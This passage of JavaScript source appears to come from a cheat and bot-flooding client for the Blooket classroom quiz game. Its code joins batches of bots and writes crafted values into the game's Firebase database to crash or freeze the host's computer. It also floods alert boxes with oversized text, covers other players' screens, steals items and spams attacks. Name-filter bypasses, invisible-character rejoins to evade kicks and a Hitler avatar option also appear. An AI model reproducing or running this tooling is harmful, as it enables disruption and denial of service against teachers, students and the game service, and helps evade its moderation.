      name: "Flood Alert Box",
      action: function (stext) {
        setUserVal(
          "up",
          `__proto__:${Date.now()}${new Array(1700).fill(stext + " ").join("")}`
        );
      },
    },
  ],
  Racing: [
    {
      type: "button",
      name: "Freeze Scoreboard and Attacks",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("pr/toString", "t");
        } else {
          setUserVal("pr", 0);
        }
        a.innerText = a.frozen
          ? "Unfreeze Scoreboard and Attacks"
          : "Freeze Scoreboard and Attacks";
      },
    },
    {
      type: "input",
      name: "Set Questions Left",
      action: function (a) {
        setUserVal("pr", gameobject.s.a - parseInt(a));
      },
    },
    {
      type: "select",
      name: "Attack player",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal(
          "tat",
          `${d}:${prompt("Which attack do you want to perform (rocket, etc)?")}`
        );
      },
    },
    {
      type: "select",
      name: "Spam Attack player",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: async function (d) {
        var spamTimes = parseInt(prompt("How many times to spam?")) || 1;
        var attToSpam = prompt("Which attack do you want to perform (rocket, etc)?");
        for (let i = 0; i < spamTimes; i++) {
          setUserVal("tat", `${d}:${attToSpam}`);
          await new Promise(r => setTimeout(r, 500));
        }
      },
    },
  ],
  Classic: [
    {
      type: "button",
      name: "Freeze Question",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("a/toString", "t");
        } else {
          setUserVal("a", 1);
        }
        a.innerText = a.frozen ? "Unfreeze Question" : "Freeze Question";
      },
    },
  ],
  Royale: [
    {
      type: "button",
      name: "Send Crash Answer",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setVal(`${botinfo.gid}/a/${botinfo.name}/a/toString`, "t");
        } else {
          setVal(`${botinfo.gid}/a/${botinfo.name}/a/toString`, 2);
        }
        a.innerText = a.frozen ? "Unsend Crash Answer" : "Send Crash Answer";
      },
    },
  ],
  Rush: [
    {
      type: "button",
      name: "Freeze Host's Computer",
      action: function (a) {
        setUserVal("bs", 1e307);
        a.innerHTML = "He aint coming back from this one!";
      },
    },
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("d/toString", "t");
        } else {
          setUserVal("d", "t");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "input",
      name: "Set Blooks",
      action: function (b) {
        setUserVal("bs", b);
      },
    },
    {
      type: "input",
      name: "Set Defense",
      action: function (b) {
        setUserVal("d", b);
      },
    },
    {
      type: "input",
      name: "Cover Host's Screen",
      action: function (adtext) {
        setUserVal(
          "d",
          (function () {
            var r = "";
            for (var i = 0; i < 100; i++) {
              r += "1";
            }
            for (var i = 0; i < 500; i++) {
              r += adtext;
              if (i % 10 === 0) {
                r += "\n\r";
              } else {
                r += " ";
              }
            }
            return r;
          })()
        );
      },
    },
  ],
  "Rush (teams)": [
    {
      type: "button",
      name: "Freeze Host's Computer",
      action: function (a) {
        setTeamVal("bs", 1e307);
        a.innerHTML = "He aint coming back from this one!";
      },
    },
    {
      type: "input",
      name: "Set Blooks",
      action: function (b) {
        setTeamVal("bs", parseInt(b));
      },
    },
    {
      type: "input",
      name: "Set Defense",
      action: function (b) {
        setTeamVal("d", parseInt(b));
      },
    },
  ],
  Factory: [
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("ca/toString", "t");
        } else {
          setUserVal("ca", 0);
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "staticsel",
      name: "Send Distraction",
      values: ["dp"],
      action: function (val) {
        setUserVal("tat", val);
      },
    },
    {
      type: "input",
      name: "Set Cash",
      action: function (b) {
        setUserVal("ca", b);
      },
    },
  ],
  Toy: [
    {
      type: "button",
      name: "Crash Host",
      action: function (a) {
        setUserVal("t/t", "t");
        a.innerText = "Crashing";
      },
    },
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("tat/t", "t");
        } else {
          setUserVal("tat", "t");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "select",
      name: "Steal Toys From",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal(
          "tat",
          `${d}:${prompt("How many toys do you want to steal?")}`
        );
      },
    },
    {
      type: "select",
      name: "Set Player's Toys",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        setUserVal(
          "tat",
          `${d}:swap:${prompt("What do you want to set it to?")}`
        );
      },
    },
    {
      type: "input",
      name: "Set Toys",
      action: function (amt) {
        setUserVal("t", amt);
      },
    },
    {
      type: "select",
      name: "Cover Player's Screen",
      computed: function (sel) {
        if (
          Object.keys(gameobject.c).length === Array.from(sel.children).length
        ) {
          return false;
        }
        return Object.keys(gameobject.c);
      },
      action: function (d) {
        var adtext = prompt(
          "Enter the text to cover their screen with:"
        );
        if (adtext) {
          if (adtext.includes(":")) {
            alert("Text cannot include a colon!");
            return;
          }
          stopBlookEnforcer();
          var adBlook = "Dog:" + new Array(500).fill(adtext).join(" ");
          setUserVal("b", adBlook);
          setTimeout(() => {
            setUserVal("tat", `${d}:100`);
            setTimeout(() => {
              startBlookEnforcer();
            }, 1000);
          }, 1000);
        }
      },
    },
    {
      type: "input",
      name: "Cover All Screens",
      action: function (adtext) {
        if (adtext) {
          if (adtext.includes(":")) {
            alert("Text cannot include a colon!");
            return;
          }
          var players = Object.keys(gameobject.c).filter(p => p !== botinfo.name);
          if (players.length === 0) {
            alert("No other players to cover!");
            return;
          }
          stopBlookEnforcer();
          var adBlook = "Dog:" + new Array(500).fill(adtext).join(" ");
          setUserVal("b", adBlook);
          var i = 0;
          var sendNext = () => {
            if (i < players.length) {
              setUserVal("tat", `${players[i]}:100`);
              i++;
              setTimeout(sendNext, 200);
            } else {
              setTimeout(() => {
                startBlookEnforcer();
              }, 1000);
            }
          };
          setTimeout(sendNext, 500);
        }
      },
    },
    {
      type: "cselect",
      name: "Send Distraction",
      values: Object.entries({
        c: "Oh Canada",
        b: "Blizzard",
        f: "Fog Spell",
        d: "Dark & Dusk",
        w: "Howling Wind",
        g: "Gift Time!",
        t: "TREES",
        s: "Snow Plow",
        fr: "Use The Force",
      }).map(([e, t]) => ({
        name: t,
        value: e,
      })),
      action: function (val) {
        setUserVal("tat", val);
      },
    },
  ],
  Unknown: [
    {
      type: "button",
      name: "Freeze Scoreboard",
      action: function (a) {
        if (a.frozen != undefined) {
          a.frozen = !a.frozen;
        } else {
          a.frozen = true;
        }
        if (a.frozen) {
          setUserVal("tat/t", "t");
        } else {
          setUserVal("tat", "t");
        }
        a.innerText = a.frozen ? "Unfreeze Scoreboard" : "Freeze Scoreboard";
      },
    },
    {
      type: "input",
      name: "Flood Alert Box",
      action: function (stext) {
        setUserVal(
          "tat",
          `${botinfo.name}:${Date.now()}${new Array(1700)
            .fill(stext + " ")
            .join("")}`
        );
      },
    },
  ],
};
var blookOptions = ["German Painter", "random", ...blooks.filter(b => b !== hitler)];
var global = [
  {
    type: "staticsel",
    name: "Set Blook",
    values: blookOptions,
    action: function (val) {
      if (val === "German Painter") {
        chosenBlook = "hitler";
        setUserVal("b", hitler);
      } else {
        chosenBlook = val;
        setUserVal("b", val);
      }
      if (val === "random") {
        stopBlookEnforcer();
      } else {
        startBlookEnforcer();
      }
    },
  },
  {
    type: "input",
    name: "Set Banner",
    action: function (b) {
      setUserVal("bg", b);
    },
  },
  {
    type: "button",
    name: "Leave Game",
    action: function (a) {
      leaveGame();
      finishG();
      a.innerText = "Leaving";
    },
  },
  {
    type: "button",
    name: "Freeze Host",
    action: function (a) {
      if (!fvals?.[botinfo?.type]) {
        alert("Freeze not found for gamemode!");
      }
      setUserVal(fvals[botinfo.type], makeLongText(1.5e5));
      a.innerText = "Freezing";
    },
  },
  {
    type: "button",
    name: "Open Chat",
    id: "ochat",
    action: function (a) {
      if (a.frozen != undefined) {
        a.frozen = !a.frozen;
      } else {
        a.frozen = true;
      }
      if (a.frozen) {
        unreads = 0;
        updateUnreads();
        document.querySelector(".chat").style.display = "block";
      } else {
        document.querySelector(".chat").style.display = "none";
      }
      a.innerText = a.frozen ? "Close Chat" : "Open Chat";
    },
  },
];

function updateUnreads() {
  document.querySelector("#ochat").innerHTML =
    unreads > 0
      ? `Open Chat <b style="color:#f00000;">(${unreads})</b>`
      : "Open Chat";
}
var ci = 0;

async function sendChatMsg(msg) {
  const encryptedMsg = await CryptoModule.encrypt(msg);
  setUserVal("msg", {
    msg: encryptedMsg,
    i: ci,
    enc: true
  });
  ci++;
}

async function decryptChatMsg(msgObj) {
  if (msgObj && msgObj.enc && msgObj.msg) {
    try {
      return await CryptoModule.decrypt(msgObj.msg);
    } catch {
      return msgObj.msg;
    }
  }
  return msgObj?.msg || msgObj;
}

function setTeamVal(path, val) {
  return setVal(`/${botinfo.gid}/a/${botinfo.name}/${path}`, val);
}
function onUpdateData(datav) {
  if (!gameobject || !gameobject.s) {
    onFirstData(datav);
  } else {
    onData(datav);
    handleChat(datav);
  }
  
  var currentStage = datav?.stg || datav?.s?.stg;
  if (lastGameStage !== currentStage && currentStage && lastGameStage === null || lastGameStage === "waiting") {
    if (chosenBlook && chosenBlook !== "random" && allBots.length > 0) {
      setTimeout(() => {
        applyBlookToAllBots(chosenBlook);
      }, 500);
    }
  }
  lastGameStage = currentStage;
  
  gameobject = datav;
}

function onBlock(data) {}

async function handleChat(data) {
  var users = data.c;
  var pusers = gameobject.c;
  for (var i in users) {
    if (users[i]?.msg?.msg) {
      if (pusers[i]?.msg?.msg) {
        if (users[i].msg.i !== pusers[i].msg.i) {
          const decryptedMsg = await decryptChatMsg(users[i].msg);
          onChat(decryptedMsg, i);
        }
      } else {
        const decryptedMsg = await decryptChatMsg(users[i].msg);
        onChat(decryptedMsg, i);
      }
    }
  }
}

function onChat(msg, name) {
  addChatMessage(`${name}: ${msg}`);
  if (document.querySelector(".chat").style.display == "none") {
    unreads++;
    updateUnreads();
  }
}

function joinGame(code, name, icog) {
  if (!canJoin) {
    errorBar("Stop spamming the button dude!");
    return;
  }
  canJoin = false;

  if (botinfo.connecting) {
    errorBar("Connecting to game, please wait...");
    canJoin = true;
    return;
  }

  var bcfElement = document.getElementById("bcf");
  if (bcfElement && bcfElement.getAttribute("checked")) {
    name = bypassFilter(name);
  }
  oname = name;
  connect(code, name, icog);

  setTimeout(() => { canJoin = true; }, 2000);
}

function onFirstData(d) {
  var gm = d.s.t;
  if (gm === "Rush") {
    if (d.s.m === "Teams") {
      gm = "Rush (teams)";
    }
  }
  renderCheats(gm);
}

function onData(d) {
  if (!d) {
    errorBar("Game crashed!");
    leaveGame();
    finishG();
    return;
  }
  procData(d);
  if (gameobject.c[botinfo.name]) {
    if (gameobject.c[botinfo.name].tat && !d.c[botinfo.name].tat) {
      alert("Attack complete!");
    }
  }
  if (d.stg === "fin" && botinfo.connected) {
    botinfo.connected = false;
    leaveGame();
    finishG();
    return;
  }
}

function procData(data) {}

function leaveGame() {
  if (botinfo.connected) {
    setUserVal("", {});
    botinfo.fbdb = false;
    deleteApp(botinfo.liveApp);
    botinfo.connected = false;
    botinfo.liveApp = false;
    gameobject = {};
    lastGameStage = null;
    stopPlayerListUpdater();
    playerSelectElements = [];
    lastPlayerListHash = "";
    updateStatus("Ready");
  }
}

async function applyBlookToAllBots(blookName) {
  if (allBots.length === 0) return;
  
  var blookValue = blookName;
  if (blookName === "hitler") {
    blookValue = hitler;
  }
  
  var promises = allBots.map(bot => {
    if (bot && bot.connected && bot.fbdb) {
      return set(ref(bot.fbdb, `/${bot.gid}/c/${bot.name}/b`), blookValue);
    }
    return Promise.resolve();
  });
  
  await Promise.all(promises);
}

function updateBotCounter() {
  var counter = document.getElementById("botCounter");
  var countSpan = document.getElementById("activeBotCount");
  if (counter && countSpan) {
    countSpan.innerText = allBots.length;
    counter.style.display = allBots.length > 0 ? "block" : "none";
  }
}

var joinAbortController = null;

async function connectBot(gid, name, icog, botIndex, selectedBlook = "random", retries = 2) {
  var bot = {
    connected: false,
    connecting: true,
    name: name,
    gid: gid,
    index: botIndex
  };
  
  for (var attempt = 0; attempt <= retries; attempt++) {
    if (joinAbortController && joinAbortController.signal.aborted) {
      bot.connecting = false;
      return null;
    }
    try {
      const encryptedPayload = await CryptoModule.encryptObject({ id: gid, name: name });
      const fetchPromise = fetch(OUR_BACKEND_URL + "/join", {
        body: JSON.stringify({ encrypted: true, data: encryptedPayload }),
        headers: { 
          "Content-Type": "application/json",
          "X-Encrypted": "AES-GCM-256"
        },
        method: "POST",
        signal: joinAbortController ? joinAbortController.signal : undefined
      });
      const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 30000));
      const response = await Promise.race([fetchPromise, timeoutPromise]);
      
      const responseText = await response.text();
      let body;
      try {
        const parsed = JSON.parse(responseText);
        if (parsed.encrypted && parsed.data) {
          body = await CryptoModule.decryptObject(parsed.data);
        } else {
          body = parsed;
        }
      } catch {
        body = JSON.parse(responseText);
      }
      
      if (body.fbShardURL && body.fbToken) {
        const liveApp = initializeApp(
          {
            apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
            authDomain: "blooket-2020.firebaseapp.com",
            projectId: "blooket-2020",
            storageBucket: "blooket-2020.appspot.com",
            messagingSenderId: "741533559105",
            appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
            measurementId: "G-S3H5NGN10Z",
            databaseURL: body.fbShardURL,
          },
          Date.now().toString() + "_" + botIndex + "_" + attempt
        );
        const auth = getAuth(liveApp);
        await signInWithCustomToken(auth, body.fbToken);
        const db = getDatabase(liveApp);
        
        var blookToUse;
        if (selectedBlook === "random") {
          blookToUse = fblooks[Math.floor(Math.random() * fblooks.length)];
        } else if (selectedBlook === "hitler") {
          blookToUse = hitler;
        } else {
          blookToUse = selectedBlook;
        }
        
        await set(ref(db, `${gid}/c/${name}`), {
          b: blookToUse,
          rt: !0
        });
        bot.fbdb = db;
        bot.liveApp = liveApp;
        bot.connecting = false;
        bot.connected = true;
        return bot;
      } else {
        if (attempt < retries) {
          await new Promise(r => setTimeout(r, 100 * (attempt + 1)));
          continue;
        }
        bot.connecting = false;
        bot.error = body.msg;
        return null;
      }
    } catch (e) {
      if (attempt < retries) {
        await new Promise(r => setTimeout(r, 100 * (attempt + 1)));
        continue;
      }
      bot.error = e.message;
      return null;
    }
  }
  return null;
}

async function joinMultipleBots(code, baseName, count, icog, selectedBlook = "random") {
  if (!canJoin) {
    errorBar("Stop spamming the button!");
    return;
  }
  canJoin = false;
  
  chosenBlook = selectedBlook;
  lastGameStage = null;
  
  leaveAllBots();
  
  joinAbortController = new AbortController();
  
  updateStatus(`Joining ${count} bots...`);
  
  renderCheats("Unknown");
  
  var bcfElement = document.getElementById("bcf");
  var bcf = bcfElement ? bcfElement.getAttribute("checked") : false;
  
  var batchSize = 5;
  var delayBetweenBatches = 250;
  
  var allResults = [];
  var botNames = [];
  
  for (var i = 0; i < count; i++) {
    var name = count > 1 ? baseName + (i + 1) : baseName;
    if (bcf) {
      name = bypassFilter(name);
    }
    botNames.push({ name: name, index: i });
  }
  
  for (var batch = 0; batch < botNames.length; batch += batchSize) {
    var batchBots = botNames.slice(batch, batch + batchSize);
    var batchNum = Math.floor(batch / batchSize) + 1;
    var totalBatches = Math.ceil(botNames.length / batchSize);
    
    updateStatus(`Joining batch ${batchNum}/${totalBatches} (${allResults.filter(b => b && b.connected).length} connected)...`);
    
    var batchPromises = batchBots.map((b, i) => {
      return new Promise(r => setTimeout(r, i * 60)).then(() =>
        connectBot(code, b.name, icog, b.index, selectedBlook)
      );
    });
    
    var batchResults = await Promise.all(batchPromises);
    allResults = allResults.concat(batchResults);
    
    if (batch + batchSize < botNames.length) {
      await new Promise(r => setTimeout(r, delayBetweenBatches));
    }
  }
  
  allBots = allResults.filter(bot => bot !== null && bot.connected);
  
  joinAbortController = null;
  
  if (allBots.length > 0) {
    botinfo = allBots[0];
    botinfo.connected = true;
    
    if (chosenBlook && chosenBlook !== "random") {
      startBlookEnforcer();
    }
    
    onValue(ref(botinfo.fbdb, `${code}`), (data) => {
      if (!botinfo.connected) return;
      onUpdateData(data.val());
    });
    onValue(ref(botinfo.fbdb, `${code}/bu`), (data) => {
      if (!botinfo.connected) return;
      onBlock(data.val());
    });
  }
  
  updateBotCounter();
  updateStatus(`Connected ${allBots.length}/${count} bots`);
  
  if (allBots.length === 0) {
    errorBar("Connection failed - maybe try a different name?");
  } else if (allBots.length < count) {
    errorBar(`Only ${allBots.length}/${count} connected - try different names`);
  }
  
  setTimeout(() => { canJoin = true; }, 1000);
}

function leaveAllBots() {
  if (joinAbortController) {
    joinAbortController.abort();
    joinAbortController = null;
  }
  stopBlookEnforcer();
  stopPlayerListUpdater();
  playerSelectElements = [];
  lastPlayerListHash = "";
  for (var i = 0; i < allBots.length; i++) {
    var bot = allBots[i];
    if (bot && bot.connected) {
      try {
        set(ref(bot.fbdb, `${bot.gid}/c/${bot.name}`), {});
        deleteApp(bot.liveApp);
      } catch(e) {}
    }
  }
  allBots = [];
  botinfo = { connected: false };
  gameobject = {};
  lastGameStage = null;
  updateBotCounter();
  updateStatus("Ready");
  canJoin = true;
}

var originalSetUserVal = async function(path, val) {
  if (!botinfo.connected) {
    errorBar("Cannot set value while disconnected!");
    return;
  }
  if (!botinfo.fbdb) {
    errorBar("Cannot set value when there is no game!");
    return;
  }
  await set(ref(botinfo.fbdb, `/${botinfo.gid}/c/${botinfo.name}/${path}`), val);
};

async function setUserVal(path, val) {
  if (allBots.length > 0) {
    var promises = allBots.map(bot => {
      if (bot && bot.connected && bot.fbdb) {
        return set(ref(bot.fbdb, `/${bot.gid}/c/${bot.name}/${path}`), val);
      }
      return Promise.resolve();
    });
    await Promise.all(promises);
  } else {
    await originalSetUserVal(path, val);
  }
}

function getTime() {
  var v = (Date.now() - new Date(gameobject.s.d).getTime()) / 60000;
  return Math.floor(v) + ":" + (Math.floor(v * 60) % 60);
}

function zalgo(text, h = 15) {
  const a = new Lunicode();
  a.tools.creepify.options.maxHeight = h;
  return a.tools.creepify.encode(text);
}
var chars = ["‮", "俿", "佒", "⾟", "็", "็", "็", "็", "็", "็", "俱", "俲"];

function makeLongText(a) {
  return new Array(a)
    .fill()
    .map((e) => chars[Math.floor(Math.random() * chars.length)])
    .join("");
}

function genCursed() {
  return makeLongText(3e6);
}

function activateAuto() {
  var rejoining = 0;
  onBlock = async (e) => {
    if (Object.keys(e).includes(botinfo.name) && !rejoining) {
      rejoining = 1;
      await rejoinGame();
      rejoining = 0;
    }
  };
  var i = 0;
  async function rejoinGame() {
    const token = await genToken(botinfo.gid, oname + genInvis(i));
    await useToken(token);
    i++;
  }
  var chars = ["​", "‌", "‍", "‎", "‏"];

  function genInvis(i) {
    return i
      .toString(5)
      .split("")
      .map((e) => chars[e.charCodeAt() - 48])
      .join("");
  }
}

document.querySelector("#gcode").addEventListener("keydown", (e) => {
  if (e.keyCode == 13) {
    join();
  }
});
document.querySelector("#gname").addEventListener("keydown", (e) => {
  if (e.keyCode == 13) {
    join();
  }
});

function createNormText(text) {
  var a = document.createElement("div");
  a.className = "normtext";
  a.innerText = text;
  return a;
}

function createCheatContainer() {
  var a = document.createElement("div");
  a.className = "cheatcontainer";
  return a;
}

function updateStatus(text) {
  var s = document.getElementById("status");
  s.innerText = "Status: " + text;
}

function createButton(text, clickaction) {
  var button = document.createElement("button");
  button.innerText = text;
  button.addEventListener("click", function () {
    clickaction(button);
  });
  return button;
}

function renderCheats(gm) {
  var mappedGm = gameModeMap[gm] || gm;
  botinfo.type = mappedGm;
  var c = document.getElementById("ctrlpanel");
  var codep = document.getElementById("cc");
  c.innerHTML = "";
  codep.style.display = "none";
  
  playerSelectElements = [];
  lastPlayerListHash = "";
  startPlayerListUpdater();
  
  c.appendChild(createNormText("Bot Successful! Type: " + gm + (mappedGm !== gm ? ` (${mappedGm})` : "")));
  if (cheats[mappedGm]) {
    c.appendChild(createNormText("Cheats: "));
    var chc = createCheatContainer();
    cheats[mappedGm].forEach((e) => {
      switch (e.type) {
        case "button":
          chc.appendChild(createButton(e.name, e.action));
          break;
        case "input":
          chc.appendChild(createInp(e.name, e.action));
          break;
        case "select":
          chc.appendChild(createSel(e.name, e.computed, e.action));
          break;
        case "staticsel":
          chc.appendChild(createStaticSel(e.name, e.values, e.action));
          break;
        case "cselect":
          chc.appendChild(createCsSel(e.name, e.values, e.action));
          break;
        case "typingstaticsel":
          chc.appendChild(createTypingStaticSel(e.name, e.values, e.action));
          break;
        default:
          break;
      }
    });
    c.appendChild(chc)
  }
  c.appendChild(createNormText("Global Cheats:"));
  c.appendChild(createGlobalContainer());
}

function finishG() {
  var cp = document.getElementById("ctrlpanel");
  var cc = document.getElementById("cc");
  document.querySelector(".chat").style.display = "none";
  cp.innerHTML = "";
  cc.style.display = "block";
  stopPlayerListUpdater();
  playerSelectElements = [];
  lastPlayerListHash = "";
  errorBar("Game Ended!");
}

function createInp(text, action) {
  var inp = document.createElement("div");
  inp.className = "inputcontainer";
  var ti = document.createElement("div");
  ti.innerText = text + ":";
  inp.appendChild(ti);
  var iv = document.createElement("input");
  iv.addEventListener("keydown", (e) => {
    if (e.keyCode == 13) {
      action(iv.value);
    }
  });
  inp.appendChild(iv);
  inp.addEventListener("click", function (e) {
    if (e.target === iv) {
      return;
    }
    action(iv.value);
  });
  return inp;
}

function createSel(text, cpval, action) {
  var inp = document.createElement("div");
  inp.className = "inputcontainer";
  var ti = document.createElement("div");
  ti.innerText = text + ":";
  inp.appendChild(ti);
  var iv = document.createElement("select");
  iv.innerHTML = "<option>Loading players...</option>";
  
  playerSelectElements.push(iv);
  
  setTimeout(() => {
    if (gameobject && gameobject.c) {
      var players = Object.keys(gameobject.c).sort();
      if (players.length > 0) {
        iv.innerHTML = "";
        players.forEach(playerName => {
          var opt = document.createElement("option");
          opt.innerText = playerName;
          opt.value = playerName;
          iv.appendChild(opt);
        });
      }
    }
  }, 100);
  
  inp.appendChild(iv);
  inp.addEventListener("click", function (e) {
    if (e.target === iv) {
      return;
    }
    action(iv.value);
  });
  return inp;
}

function createGlobalContainer() {
  var chc = createCheatContainer();
  global.forEach((e) => {
    switch (e.type) {
      case "button":
        let b = createButton(e.name, e.action);
        if (e.id) {
          b.id = e.id;
        }
        chc.appendChild(b);
        break;
      case "input":
        chc.appendChild(createInp(e.name, e.action));
        break;
      case "select":
        chc.appendChild(createSel(e.name, e.computed, e.action));
        break;
      case "staticsel":
        chc.appendChild(createStaticSel(e.name, e.values, e.action));
        break;
      default:
        break;
    }
  });
  return chc;
}

function createStaticSel(text, vals, action) {
  var inp = document.createElement("div");
  inp.className = "inputcontainer";
  var ti = document.createElement("div");
  ti.innerText = text + ":";
  inp.appendChild(ti);
  var iv = document.createElement("input");
  iv.className = "typing-dropdown";
  iv.setAttribute("list", "options-" + text);
  iv.setAttribute("placeholder", "Select or Search");
  inp.appendChild(iv);
  var dl = document.createElement("datalist");
  dl.id = "options-" + text;
  vals.sort().forEach((e) => {
    var opt = document.createElement("option");
    opt.value = e;
    dl.appendChild(opt);
  });
  inp.appendChild(dl);
  inp.addEventListener("change", function (e) {
    if (e.target === iv) {
      action(iv.value);
    }
  });
  return inp;
}

function createCsSel(text, vals, action) {
  var inp = document.createElement("div");
  inp.className = "inputcontainer";
  var ti = document.createElement("div");
  ti.innerText = text + ":";
  inp.appendChild(ti);
  var iv = document.createElement("input");
  iv.className = "typing-dropdown";
  iv.setAttribute("list", "options-" + text);
  iv.setAttribute("placeholder", "Select or Type");
  inp.appendChild(iv);
  var dl = document.createElement("datalist");
  dl.id = "options-" + text;
  vals.sort().forEach((e) => {
    var opt = document.createElement("option");
    opt.innerText = e?.name;
    opt.value = e?.value;
    dl.appendChild(opt);
  });
  inp.appendChild(dl);
  inp.addEventListener("change", function (e) {
    if (e.target === iv) {
      action(iv.value);
    }
  });
  return inp;
}

function findGameCode(str) {
  const regex = /\b\d{7}\b/;
  const match = str.match(regex);
  if (match) {
    return match[0];
  } else {
    return null;
  }
}

var dragging = false;
var prevpos = {
  x: 0,
  y: 0,
};
document.querySelector("#drag").addEventListener("mousedown", (e) => {
  dragging = true;
});
document.body.addEventListener("mousemove", function (e) {
  if (dragging) {
    document.querySelector(".chat").style.left =
      parseInt(document.querySelector(".chat").style.left) +
      e.clientX -
      prevpos.x +
      "px";
    document.querySelector(".chat").style.top =
      parseInt(document.querySelector(".chat").style.top) +
      e.clientY -
      prevpos.y +
      "px";
  }
  prevpos = {
    x: e.clientX,
    y: e.clientY,
  };
});
document.querySelector("#chat").addEventListener("keydown", (e) => {
  if (e.keyCode == 13) {
    var msg = document.querySelector("#chat").value;
    if (msg[0] == "/") {
      processCmd(msg);
    } else {
      sendChatMsg(msg);
    }
    document.querySelector("#chat").value = "";
  }
});

function processCmd(msg) {
  var cmd = msg.split("/")[1];
  switch (cmd) {
    case "clear":
      document.querySelector(
        ".chatcontainer"
      ).innerHTML = `<div class="chatmsg"></div>`;
      break;
    case "help":
      addChatMessage(
        "Available Commands: /clear (clears chat window), /help (shows this menu)"
      );
      break;
  }
}
document.querySelector("#drag").addEventListener("mouseup", (e) => {
  dragging = false;
});

const FIREBASE_BACKEND_URL = "https://procces-3efd9-default-rtdb.firebaseio.com/backends/blooket.json";

const FALLBACK_BACKEND_URL = "http://localhost:4500";

var OUR_BACKEND_URL = FALLBACK_BACKEND_URL;
var backendUrlLoaded = false;

async function loadBackendUrl() {
  try {
    const cachedUrl = await SecureStorage.get("backendUrl");
    if (cachedUrl && cachedUrl.url) {
      const cacheAge = Date.now() - (cachedUrl.timestamp || 0);
      if (cacheAge < 30000) {
        OUR_BACKEND_URL = cachedUrl.url;
        backendUrlLoaded = true;
        updateBackendStatus(true);
      }
    }
  } catch (e) {}
  
  try {
    const response = await fetch(FIREBASE_BACKEND_URL, {
      cache: 'no-store'
    });
    
    if (response.ok) {
      const data = await response.json();
      if (data && data.url) {
        OUR_BACKEND_URL = data.url;
        backendUrlLoaded = true;
        await SecureStorage.set("backendUrl", {
          url: data.url,
          updated: data.updated,
          status: data.status,
          timestamp: Date.now()
        });
        updateBackendStatus(true);
        return data.url;
      }
    }
  } catch (e) {}
  
  updateBackendStatus(false);
  return FALLBACK_BACKEND_URL;
}

function updateBackendStatus(isRemote) {
  const statusEl = document.getElementById("backend-status");
  if (statusEl) {
    if (isRemote) {
      statusEl.innerHTML = `<span style="color: var(--success);">✓ Encrypted</span>`;
      statusEl.title = "Secure connection established";
    } else {
      statusEl.innerHTML = `<span style="color: var(--text-muted);">⚡ Local</span>`;
      statusEl.title = "Using local server";
    }
  }
}

loadBackendUrl();

async function genToken(gid, name) {
  const encryptedPayload = await CryptoModule.encryptObject({ id: gid, name: name });
  const response = await fetch(OUR_BACKEND_URL + "/join", {
    body: JSON.stringify({ encrypted: true, data: encryptedPayload }),
    headers: {
      "Content-Type": "application/json",
      "X-Encrypted": "AES-GCM-256"
    },
    method: "POST",
  });
  
  const responseText = await response.text();
  let data;
  try {
    const parsed = JSON.parse(responseText);
    if (parsed.encrypted && parsed.data) {
      data = await CryptoModule.decryptObject(parsed.data);
    } else {
      data = parsed;
    }
  } catch {
    data = JSON.parse(responseText);
  }
  
  const { fbToken, fbShardURL } = data;
  return {
    gid,
    name,
    fbToken,
    fbShardURL,
  };
}
async function useToken(token) {
  const { gid, name, fbToken, fbShardURL } = token;
  await connect(
    gid,
    name,
    document.getElementById("icogmode").getAttribute("checked"),
    {
      success: !0,
      fbShardURL,
      fbToken,
    }
  );
}

function recoverInfoFromFbToken(fbToken) {
  return JSON.parse(atob(fbToken.split(".")[1]));
}

function addChatMessage(a) {
  var d = document.createElement("div");
  d.className = "chatmsg";
  d.innerText = a.replaceAll("‮", "");
  document
    .querySelector(".chatcontainer")
    .insertBefore(d, document.querySelector(".chatcontainer > div"));
}
document.querySelectorAll("checkbox").forEach((e) => {
  e.addEventListener("click", function () {
    if (e.getAttribute("checked")) {
      e.removeAttribute("checked");
    } else {
      e.setAttribute("checked", "true");
    }
  });
});
function genMessage(msg, amt) {
  var t = "";
  for (var i = 0; i < amt; i++) {
    t += msg + " ";
  }
  return t;
}
async function connect(gid, name, icog, reqbody = !1) {
  botinfo.connected = false;
  botinfo.connecting = true;
  botinfo.name = name;
  botinfo.gid = gid;
  updateStatus("Fetching token (encrypted)...");
  
  let body;
  if (reqbody) {
    body = reqbody;
  } else {
    const encryptedPayload = await CryptoModule.encryptObject({ id: gid, name: name });
    const response = await fetch(OUR_BACKEND_URL + "/join", {
      body: JSON.stringify({ encrypted: true, data: encryptedPayload }),
      headers: {
